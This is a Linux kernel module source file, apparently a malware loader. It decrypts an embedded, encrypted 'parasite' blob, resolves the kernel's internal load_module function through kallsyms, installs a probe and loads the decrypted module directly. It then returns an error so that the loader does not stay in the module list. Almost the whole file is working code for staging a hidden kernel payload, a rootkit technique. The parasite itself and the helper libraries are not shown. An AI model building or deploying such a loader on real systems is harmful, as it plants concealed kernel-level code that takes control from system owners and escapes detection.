#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/jiffies.h>
#include <linux/wait.h>

#include "libs/encrypt.h"
#include "libs/symbol_lookup.h"
#include "libs/load_helpers.h"
#include "libs/probe_helpers.h"

#define USER_MEMORY_LIMIT 0x00007fffffffffff

static char parasite_blob[] = {
# include "parasite_blob.inc"
};

int init_module(void)
{
    int err;
	asmlinkage int (*load_module)(struct load_info *, const char*, int) = NULL;    
    
    printk("%s is saying:\n"
	       "Hello, I'm the loader.\n"
	       "I will load the parasite for you.\n", KBUILD_MODNAME);
    
    
    init_kallsyms();

    printk(KERN_INFO "kallsyms initialized\n");
	
    do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);

    printk(KERN_INFO "parasite decrypted\n");

    // init struct
    struct load_info *info = kmalloc(sizeof(struct load_info), GFP_KERNEL);
    info->len = sizeof(parasite_blob);
    info->hdr = __vmalloc(sizeof(parasite_blob), GFP_KERNEL | __GFP_NOWARN);
    if (!info->hdr) {
        printk(KERN_ERR "vmalloc failed\n");
    	return -ENOMEM;
    }

    //copy module
    if (copy_chunked_from_kernel(info->hdr, parasite_blob, sizeof(parasite_blob)) != 0) {
        vfree(info->hdr);
        printk(KERN_ERR "copy failed\n");
        return -EFAULT;
    } 

    printk(KERN_INFO "module ready\n");

    if (init_probe() != 0) {
        return -EFAULT;
    }
    
    printk(KERN_INFO "probe installed\n");


    load_module = (void *)kallsyms_lookup_name("load_module");
    if (load_module) {
        
        if ((err = load_module(info, (char*) 0x4242, 0)) != 0) {
            printk(KERN_ERR "Error loading module: %d\n", err);
        }

    }

    remove_probe();
    
	return -EINVAL;
}

void cleanup_module(void) 

{ 
    remove_probe();
    pr_info("Goodbye world 1.\n"); 

} 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pasquale Caporaso");
